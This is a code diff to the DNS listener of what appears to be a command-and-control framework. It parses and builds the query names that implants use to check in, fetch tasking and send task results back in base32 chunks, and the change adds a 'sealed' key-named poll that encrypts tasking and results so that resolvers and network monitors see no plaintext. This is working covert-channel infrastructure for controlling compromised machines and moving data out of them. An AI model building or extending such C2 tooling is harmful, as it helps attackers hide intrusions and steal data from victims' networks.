@@ -13,6 +13,11 @@ namespace Rod.Transport.Listeners.Dns;
 //   poll (presence + fetch next tasking):
 //     p.<b32(implant id)>.<zone>
 //
+//   key-named poll (the sealed carriage, an artifact whose build baked an
+//   envelope key): the poll names the key id, so the answer is sealed under
+//   that key -- the raw R1 AES-GCM body, base32 like every TXT payload here:
+//     k.<b32(implant id)>.<b32(key id)>.<zone>
+//
 //   result chunk (report a task's outcome, short outputs only):
 //     r.<b32(task id)>.<outcome s|f>.<seq>.<terminal t|m>.<b32(chunk)>.<b32(implant id)>.<zone>
 //
@@ -21,6 +26,14 @@ namespace Rod.Transport.Listeners.Dns;
 // empty NOERROR answer. The chunk sequence is 0-origin decimal; the terminal
 // flag closes the reassembly. Short-argument tasking only: a TaskRequest that
 // does not fit the DNS budget is not claimed over this transport.
+//
+// Sealing (an artifact with a baked envelope key, the same posture the web
+// envelope check-ins carry): the k-poll's answer and the r/c chunks wrap their
+// payloads as raw R1 bodies under purpose-specific AADs, so the resolver chain
+// reads no frame bytes in the clear; a p-poll from a key-bound implant is
+// answered empty (the downgrade refusal -- plaintext tasking is not handed to
+// an artifact known to carry a key), and a plaintext r/c reassembly from one
+// is dropped the same way.
 
 /// <summary>
 /// Parses and renders the check-in query names. Pure grammar, no I/O -- the
@@ -30,6 +43,13 @@ internal static class DnsCheckInNames
 {
     /// <summary>A poll: the implant's presence ping and task fetch.</summary>
     internal sealed record Poll(ImplantId Implant);
+
+    /// <summary>
+    /// A key-named poll: the same presence ping and task fetch, with the
+    /// artifact's envelope key id riding the name so the answer seals under
+    /// that key -- the resolver chain reads no tasking bytes in the clear.
+    /// </summary>
+    internal sealed record SealedPoll(ImplantId Implant, Guid KeyId);
 
     /// <summary>One chunk of a task result the implant reports back.</summary>
     internal sealed record ResultChunk(
@@ -77,6 +97,24 @@ internal static class DnsCheckInNames
         if (!TryDecodeId(labels[1], out var implant))
             return null;
         return new Poll(implant);
+    }
+
+    /// <summary>
+    /// Parses a key-named poll against <paramref name="zone"/>:
+    /// k.&lt;b32(implant id)&gt;.&lt;b32(key id)&gt;. The key id is the raw
+    /// 16-byte guid form, the same bytes the baked key packs.
+    /// </summary>
+    public static SealedPoll? TryParseSealedPoll(string name, string zone)
+    {
+        if (!TryStripZone(name, zone, out var labels))
+            return null;
+        if (labels.Length != 3 || labels[0] != "k")
+            return null;
+        if (!TryDecodeId(labels[1], out var implant))
+            return null;
+        if (!TryDecode(labels[2], out var keyBytes) || keyBytes.Length != 16)
+            return null;
+        return new SealedPoll(implant, new Guid(keyBytes));
     }
 
     public static ResultChunk? TryParseResult(string name, string zone)
@@ -151,6 +189,13 @@ internal static class DnsCheckInNames
     /// <summary>Renders a poll name (the implant-side twin of the parser).</summary>
     public static string PollName(ImplantId implant, string zone)
         => $"p.{Encode(implant.ToString())}.{zone}";
+
+    /// <summary>
+    /// Renders a key-named poll (the implant-side twin of the parser): the
+    /// key id rides as its raw 16 guid bytes, base32 like every label.
+    /// </summary>
+    public static string SealedPollName(ImplantId implant, Guid keyId, string zone)
+        => $"k.{Encode(implant.ToString())}.{Encode(keyId.ToByteArray())}.{zone}";
 
     /// <summary>Renders a result-chunk name under <paramref name="zone"/>.</summary>
     public static string ResultName(
@@ -248,7 +293,7 @@ internal static class DnsCheckInNames
         if (head.Length == 0)
             return false;
         labels = head.Split('.');
-        return labels.Length > 0 && labels[0] is "p" or "r" or "c" or "e" or "a";
+        return labels.Length > 0 && labels[0] is "p" or "k" or "r" or "c" or "e" or "a";
     }
 
     private static bool TryDecodeId(string label, out ImplantId implant)
@@ -346,7 +391,10 @@ internal static class DnsCheckInNames
         private readonly ConcurrentDictionary<TaskId, ConcurrentDictionary<int, byte[]>> _byTask = new();
         private readonly ConcurrentDictionary<TaskId, int> _bytesByTask = new();
 
-        public const int MaxTaskBytes = 4 * 1024;
+        // The per-task output ceiling, sealed overhead included: a keyed
+        // artifact's blob is plaintext plus the R1 body's fixed 46 bytes, so
+        // the cap keeps the same plaintext capacity it always had.
+        public const int MaxTaskBytes = 4 * 1024 + 64;
         public const int MaxTasks = 256;
 
         /// <summary>
